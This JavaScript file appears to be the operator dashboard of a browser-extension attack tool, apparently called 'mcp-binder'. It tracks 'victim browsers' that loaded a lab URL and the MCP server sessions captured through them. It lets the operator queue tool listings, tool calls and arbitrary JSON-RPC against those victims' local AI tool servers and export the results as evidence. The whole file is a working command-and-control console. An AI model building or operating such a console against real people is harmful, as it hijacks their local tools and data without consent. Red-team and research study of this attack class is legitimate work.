import {
  buildRawRpcTask,
  buildToolsCallTask,
  buildToolsListTask,
  clearDashboardState,
  discoveredToolsForSession,
  fetchDashboardExport,
  fetchDashboardState,
  queueDashboardTask,
  resultsForSession,
  summarizeDashboardState,
  tasksForSession
} from "../src/dashboard-client.js";
import { dashboardBaseFromRuntimeConfig, loadRuntimeConfig } from "../src/runtime-config.js";

const dashboardBaseInput = document.querySelector("#dashboardBaseInput");
const dashboardTokenInput = document.querySelector("#dashboardTokenInput");
const refreshButton = document.querySelector("#refreshButton");
const clearButton = document.querySelector("#clearButton");
const exportButton = document.querySelector("#exportButton");
const statusBadge = document.querySelector("#statusBadge");
const victimCount = document.querySelector("#victimCount");
const victimsList = document.querySelector("#victimsList");
const sessionCount = document.querySelector("#sessionCount");
const sessionsList = document.querySelector("#sessionsList");
const selectedSessionLabel = document.querySelector("#selectedSessionLabel");
const toolsListButton = document.querySelector("#toolsListButton");
const toolCallButton = document.querySelector("#toolCallButton");
const rawRpcButton = document.querySelector("#rawRpcButton");
const toolSelect = document.querySelector("#toolSelect");
const toolArgsInput = document.querySelector("#toolArgsInput");
const rawRpcInput = document.querySelector("#rawRpcInput");
const toolCount = document.querySelector("#toolCount");
const toolsList = document.querySelector("#toolsList");
const resultCount = document.querySelector("#resultCount");
const resultsList = document.querySelector("#resultsList");
const rawEvidence = document.querySelector("#rawEvidence");
const toolInventoryState = document.querySelector("#toolInventoryState");
const timelineState = document.querySelector("#timelineState");

let dashboardState = null;
let selectedSessionId = "";
let runtimeConfig = null;

refreshButton.addEventListener("click", refresh);
clearButton.addEventListener("click", clearLiveState);
exportButton.addEventListener("click", exportEvidence);
toolsListButton.addEventListener("click", () => queueTask(buildToolsListTask()));
toolCallButton.addEventListener("click", () => {
  const tool = toolSelect.value;
  const args = parseJson(toolArgsInput.value, "Arguments JSON");
  if (args) {
    queueTask(buildToolsCallTask(tool, args));
  }
});
rawRpcButton.addEventListener("click", () => {
  const rpc = parseJson(rawRpcInput.value, "Raw JSON-RPC");
  if (rpc) {
    queueTask(buildRawRpcTask(rpc));
  }
});

[dashboardBaseInput, dashboardTokenInput].forEach((input) => {
  input.addEventListener("change", saveSettings);
});

toolSelect.addEventListener("change", () => {
  const tool = selectedTools().find((item) => item.name === toolSelect.value);
  toolArgsInput.value = JSON.stringify(schemaArgs(tool?.inputSchema || tool?.input_schema || {}), null, 2);
});

async function init() {
  const params = new URLSearchParams(location.search);
  runtimeConfig = await loadRuntimeConfig();
  const configuredDashboard = dashboardBaseFromRuntimeConfig(runtimeConfig);
  const stored = await chrome.storage.local.get(["dashboardBase", "dashboardToken"]);
  dashboardBaseInput.value = params.get("dashboard") || stored.dashboardBase || configuredDashboard || "";
  dashboardTokenInput.value = stored.dashboardToken || "";
  await refresh();
}

async function refresh() {
  saveSettings();
  setStatus("Refreshing", "running");

  try {
    dashboardState = await getDashboardState();
    const summary = summarizeDashboardState(dashboardState);
    if (!selectedSessionId && summary.sessions[0]) {
      selectedSessionId = summary.sessions[0].id;
    }
    if (selectedSessionId && !summary.sessions.some((session) => session.id === selectedSessionId)) {
      selectedSessionId = summary.sessions[0]?.id || "";
    }
    render(summary);
    setStatus("Online", "done");
  } catch (error) {
    dashboardState = null;
    render(null);
    setStatus(error instanceof Error ? error.message : String(error), "error");
  }
}

async function exportEvidence() {
  try {
    const evidence = await getDashboardExport();
    downloadJson(evidence, "mcp-binder-evidence");
    setStatus("Evidence exported", "done");
  } catch (error) {
    setStatus(error instanceof Error ? error.message : String(error), "error");
  }
}

async function clearLiveState() {
  try {
    dashboardState = await clearDashboardState(dashboardBaseInput.value, dashboardTokenInput.value);
    selectedSessionId = "";
    render(summarizeDashboardState(dashboardState));
    setStatus("Live state cleared", "done");
  } catch (error) {
    setStatus(error instanceof Error ? error.message : String(error), "error");
  }
}

async function queueTask(task) {
  if (!selectedSessionId) {
    return;
  }

  try {
    await queueTaskForSelectedSession(task);
    setStatus("Task queued", "done");
    await refresh();
  } catch (error) {
    setStatus(error instanceof Error ? error.message : String(error), "error");
  }
}

function render(summary) {
  const sessions = summary?.sessions || [];
  const victims = summary?.victims || [];
  victimCount.textContent = String(victims.length);
  renderVictims(victims);
  sessionCount.textContent = String(sessions.length);
  renderSessions(sessions);
  renderSelectedSession();
  rawEvidence.textContent = dashboardState ? JSON.stringify(dashboardState, null, 2) : "{}";
}

function renderVictims(victims) {
  victimsList.textContent = "";
  victimsList.classList.toggle("empty", victims.length === 0);

  if (!victims.length) {
    victimsList.textContent = "No victim browsers have loaded the lab URL.";
    return;
  }

  for (const victim of victims) {
    const item = document.createElement("div");
    item.className = "sessionItem";
    item.innerHTML = `
      <strong>${escapeHtml(victim.id || victim.victimId || "victim")}</strong>
      <span>${escapeHtml(victim.origin || "")}</span>
      <small>${escapeHtml(victim.launchUrl || victim.launcher || "")}</small>
    `;
    victimsList.append(item);
  }
}

function renderSessions(sessions) {
  sessionsList.textContent = "";
  sessionsList.classList.toggle("empty", sessions.length === 0);

  if (!sessions.length) {
    sessionsList.textContent = "No captured sessions.";
    return;
  }

  for (const session of sessions) {
    const button = document.createElement("button");
    button.type = "button";
    button.className = "sessionItem";
    if (session.id === selectedSessionId) {
      button.classList.add("selected");
    }
    button.innerHTML = `
      <strong>${escapeHtml(sessionTitle(session))}</strong>
      <span>${escapeHtml(session.status || "registered")}</span>
      <small>${escapeHtml(session.origin || "")}</small>
    `;
    button.addEventListener("click", () => {
      selectedSessionId = session.id;
      renderSelectedSession();
      renderSessions(sessions);
    });
    sessionsList.append(button);
  }
}

function renderSelectedSession() {
  const session = selectedSession();
  const tools = selectedTools();
  const results = dashboardState ? resultsForSession(dashboardState, selectedSessionId) : [];
  const tasks = dashboardState ? tasksForSession(dashboardState, selectedSessionId) : [];
  const hasSession = Boolean(session);

  selectedSessionLabel.textContent = session ? sessionTitle(session) : "No session";
  toolsListButton.disabled = !hasSession;
  toolCallButton.disabled = !hasSession || !tools.length;
  rawRpcButton.disabled = !hasSession;
  toolSelect.disabled = !hasSession || !tools.length;

  toolCount.textContent = String(tools.length);
  toolInventoryState.textContent = tools.length ? `${tools.length} discovered` : "empty";
  renderTools(tools);

  resultCount.textContent = String(results.length);
  timelineState.textContent = results.length || tasks.length ? `${tasks.length} queued, ${results.length} results` : "idle";
  renderResults(results, tasks);
}

function renderTools(tools) {
  toolsList.textContent = "";
  toolsList.classList.toggle("empty", tools.length === 0);
  toolSelect.textContent = "";

  if (!tools.length) {
    toolsList.textContent = "No tools captured yet.";
    return;
  }

  for (const tool of tools) {
    const option = document.createElement("option");
    option.value = tool.name;
    option.textContent = tool.name;
    toolSelect.append(option);

    const item = document.createElement("div");
    item.className = "toolItem";
    item.innerHTML = `
      <strong>${escapeHtml(tool.name)}</strong>
      <p>${escapeHtml(tool.description || "No description.")}</p>
      <small>${escapeHtml(schemaSummary(tool.inputSchema || tool.input_schema))}</small>
    `;
    toolsList.append(item);
  }
}

function renderResults(results, tasks) {
  resultsList.textContent = "";
  resultsList.classList.toggle("empty", results.length === 0 && tasks.length === 0);

  if (!results.length && !tasks.length) {
    resultsList.textContent = "No tasks or results for this session.";
    return;
  }

  for (const task of tasks) {
    const item = document.createElement("div");
    item.className = task.claimedAt ? "resultItem claimed" : "resultItem queued";
    item.innerHTML = `
      <strong>${escapeHtml(task.kind || "task")}</strong>
      <small>${escapeHtml(task.claimedAt ? `claimed ${task.claimedAt}` : `queued ${task.createdAt || ""}`)}</small>
      <pre>${escapeHtml(JSON.stringify(task, null, 2))}</pre>
    `;
    resultsList.append(item);
  }

  for (const result of results) {
    const item = document.createElement("div");
    item.className = "resultItem";
    item.innerHTML = `
      <strong>${escapeHtml(result.stage || "result")}</strong>
      <small>${escapeHtml(result.receivedAt || "")}</small>
      <pre>${escapeHtml(JSON.stringify(result.data || result, null, 2))}</pre>
    `;
    resultsList.append(item);
  }
}

function selectedSession() {
  const sessions = Object.values(dashboardState?.sessions || {});
  return sessions.find((session) => session.id === selectedSessionId) || null;
}

function selectedTools() {
  return dashboardState && selectedSessionId ? discoveredToolsForSession(dashboardState, selectedSessionId) : [];
}

function sessionTitle(session) {
  const port = session.descriptor?.port || session.meta?.profile?.port || portFromOrigin(session.origin);
  const transport = session.transport || "streamable";
  const target = session.descriptor?.host || session.meta?.target || "";
  return target ? `${target} :${port || "?"} (${transport})` : `MCP :${port || "?"} (${transport})`;
}

function schemaSummary(schema) {
  const properties = schema?.properties && typeof schema.properties === "object" ? Object.keys(schema.properties) : [];
  if (!properties.length) {
    return "no input schema";
  }

  return `args: ${properties.slice(0, 6).join(", ")}${properties.length > 6 ? "..." : ""}`;
}

function portFromOrigin(origin) {
  try {
    return new URL(origin || "").port;
  } catch {
    return "";
  }
}

function parseJson(text, label) {
  try {
    return JSON.parse(text || "{}");
  } catch {
    setStatus(`${label} must be valid JSON`, "error");
    return null;
  }
}

function schemaArgs(schema) {
  const properties = schema?.properties && typeof schema.properties === "object" ? schema.properties : {};
  const args = {};

  for (const [key, value] of Object.entries(properties)) {
    args[key] = sampleValue(value);
  }

  return args;
}

function sampleValue(schema) {
  if (schema?.default !== undefined) {
    return schema.default;
  }

  if (schema?.type === "number" || schema?.type === "integer") {
    return 0;
  }

  if (schema?.type === "boolean") {
    return false;
  }

  if (schema?.type === "array") {
    return [];
  }

  if (schema?.type === "object") {
    return {};
  }

  return "";
}

function setStatus(label, state) {
  statusBadge.textContent = label;
  statusBadge.className = `badge ${state}`;
}

function saveSettings() {
  chrome.storage.local.set({
    dashboardBase: dashboardBaseInput.value.trim(),
    dashboardToken: dashboardTokenInput.value.trim()
  }).catch(() => {});
}

async function getDashboardState() {
  return fetchDashboardState(dashboardBaseInput.value, dashboardTokenInput.value);
}

async function getDashboardExport() {
  return fetchDashboardExport(dashboardBaseInput.value, dashboardTokenInput.value);
}

async function queueTaskForSelectedSession(task) {
  return queueDashboardTask(dashboardBaseInput.value, dashboardTokenInput.value, selectedSessionId, task);
}

function downloadJson(value, prefix) {
  const blob = new Blob([JSON.stringify(value, null, 2)], {
    type: "application/json"
  });
  const url = URL.createObjectURL(blob);
  const anchor = document.createElement("a");
  anchor.href = url;
  anchor.download = `${prefix}-${new Date().toISOString().replace(/[:.]/g, "-")}.json`;
  anchor.click();
  URL.revokeObjectURL(url);
}

function escapeHtml(value) {
  return String(value ?? "").replace(/[&<>"']/g, (char) => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  }[char]));
}

init().catch((error) => setStatus(error instanceof Error ? error.message : String(error), "error"));
